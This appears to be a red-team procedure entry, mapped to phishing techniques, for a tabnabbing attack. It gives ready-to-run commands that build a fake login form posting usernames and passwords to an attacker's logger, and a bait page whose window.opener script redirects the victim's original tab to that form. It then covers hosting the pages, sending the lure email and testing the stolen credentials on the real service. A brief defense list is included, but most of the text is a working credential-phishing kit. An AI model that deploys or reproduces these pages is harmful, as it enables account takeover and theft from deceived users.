---
id: c0b8031f-bde1-4a7d-8aca-e652c6caf468
name: Tabnabbing-Phishing-Redirect-Attack
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:40.543394+00:00'
updated_at: '2023-04-06T03:56:40.569417+00:00'
tactics:
  - '[[tactics/Initial Access|TA0001 - Initial Access]]'
techniques:
  - '[[techniques/Phishing|T1566 - Phishing]]'
  - '[[techniques/Spearphishing Link|T1566.002 - Spearphishing Link]]'
sub_techniques: []
tags:
  - '[[tags/How to exploit]]'
  - '[[tags/Tabnabbing]]'
  - phishing
  - social-engineering
commands:
  - '[[commands/create-tabnabbing-bait-html]]'
  - '[[commands/create-phishing-login-html]]'
  - '[[commands/start-simple-http-server]]'
platforms:
  - Web
  - Browser
tools: []
validated: true
---

# Tabnabbing-Phishing-Redirect-Attack

## Summary

The Tabnabbing Phishing Redirect Attack is a social engineering technique that leverages JavaScript to redirect a victim's original browser tab to a fake login page. By tricking the victim into opening a malicious link in a new tab while they have a legitimate site open (e.g., email), the attack redirects the original tab to capture credentials without the victim noticing the URL change.

## Description

This procedure exploits user trust in open tabs by using the 'window.opener' JavaScript property to alter the location of the parent window from a newly opened tab. The attacker hosts a bait page with this script and sends a phishing email linking to it. When the victim opens the link in a new tab, the script executes, redirecting their original tab (e.g., from email to a phishing login mimicking the service). The victim, assuming they were logged out, re-enters credentials on the fake page, which are captured by the attacker. This targets web-based services like email or corporate portals and requires no technical vulnerabilities, only social engineering. It is effective against users who do not verify URLs.

## Requirements

1. Control over a web server or hosting service to deploy bait and phishing pages (e.g., VPS, shared hosting).
2. A domain or subdomain for the phishing site to mimic legitimacy (e.g., evil.com).
3. Ability to send targeted emails to the victim (e.g., via compromised account or spoofing tools).
4. Basic knowledge of HTML and JavaScript for page creation.
5. A way to receive and log captured credentials (e.g., simple PHP script or external logger).

## Defense

- Educate users to verify URLs before entering credentials and avoid opening unsolicited links in new tabs.
- Implement email filtering to block suspicious links and sender spoofing.
- Use multi-factor authentication (MFA) to mitigate credential theft.
- Enable browser protections like popup blockers and monitor for anomalous JavaScript executions via endpoint detection tools.
- Deploy URL inspection tools or browser extensions that highlight tab changes.

## Objectives

1. Redirect the victim's legitimate tab to a controlled phishing page to capture login credentials.
2. Achieve initial access to the victim's accounts or network via stolen credentials.
3. Demonstrate social engineering risks in red team exercises.

## Instructions

### Step 1: Create the Phishing Login Page

**Context**: Build a fake login form that mimics the target service (e.g., email provider) and captures submitted credentials by posting to a logging endpoint. This page will appear in the redirected original tab.

**Command** ([[commands/create-phishing-login-html]]):
```bash
echo '<!DOCTYPE html><html><head><title>Login - Example Service</title></head><body><form action="http://$_PHISH_HOST/logger.php" method="POST"><input type="text" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><button type="submit">Login</button></form><p>You have been logged out due to inactivity.</p></body></html>' > phish.html
```

> This command generates a basic HTML file for the phishing page. Replace $_PHISH_HOST with your hosting domain/IP. Expected output: File 'phish.html' created. Verify by opening in a browser to ensure the form submits data.

### Step 2: Create the Bait Page with Redirect Script

**Context**: Develop the bait page that the victim will open in a new tab. It contains JavaScript to redirect the opener window to the phishing page, often with distracting content to keep the victim focused on the new tab.

**Code** ([[codes/JavaScript-Tabnabbing-Window-Opener-Redirect]]):
Embed the following in an HTML file:

> This step uses the provided code snippet to create the redirect. Save it as 'bait.html' and host it. Expected output: Victim's original tab redirects upon new tab load. Test locally by opening bait.html in a new tab from a legit site.

**Command** ([[commands/create-tabnabbing-bait-html]]):
```bash
echo '<!DOCTYPE html><html><head><title>Interesting Article</title></head><body><h1>Click here for more info</h1><script>window.opener.location = "http://$_PHISH_HOST/phish.html";</script><p>Distracting content...</p></body></html>' > bait.html
```

> Generates the bait HTML with embedded JS. $_PHISH_HOST is your phishing server. Expected output: 'bait.html' file. The script executes immediately on load.

### Step 3: Host the Bait and Phishing Pages

**Context**: Serve both pages from the same or accessible hosts to ensure the redirect works. Use a simple HTTP server for testing or production hosting.

**Command** ([[commands/start-simple-http-server]]):
```bash
python3 -m http.server $_PORT --directory .
```

> Starts a Python HTTP server in the current directory (containing bait.html and phish.html). Use $_PORT=80 for HTTP. Expected output: Server running on http://0.0.0.0:$_PORT. Access files via browser to verify.

### Step 4: Send the Phishing Email and Monitor

**Context**: Craft and send an email with the bait link, encouraging the victim to open it in a new tab (e.g., "Right-click and open in new tab for quick view"). Set up logging on the phishing page to capture POST data.

> Manually compose the email using your email client or tool, including the link to bait.html (e.g., http://yourdomain.com/bait.html). Explain why: To trigger the new tab scenario. Expected output: Victim receives email and clicks link. Monitor server logs for form submissions containing username/password.

### Step 5: Capture and Verify Credentials

**Context**: Once submitted, credentials are sent to your logger. Verify success by checking logs and testing the stolen creds on the real site.

> If using a simple logger.php (create separately), tail the log file. Expected output: POST data with username and password fields. Success if creds grant access to the target service.
